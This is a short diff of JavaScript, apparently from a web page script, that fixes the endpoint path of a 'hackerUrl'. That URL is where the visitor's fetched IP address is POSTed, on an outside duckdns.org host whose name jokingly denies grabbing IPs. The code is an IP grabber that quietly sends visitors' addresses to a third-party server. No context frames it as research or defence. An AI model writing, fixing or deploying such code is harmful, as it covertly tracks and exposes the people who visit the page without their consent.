@@ -9,7 +9,7 @@
             ip = data.ip;
         })
         .catch(error => console.log(error));
-        const hackerUrl = isLocal? "http://localhost/saveip:3000" : "http://imnotgrabbingyourip.duckdns.org:3000"
+        const hackerUrl = isLocal? "http://localhost/saveip:3000" : "http://imnotgrabbingyourip.duckdns.org:3000/saveip"
         await fetch(hackerUrl, {
             method: 'POST',
             headers: {
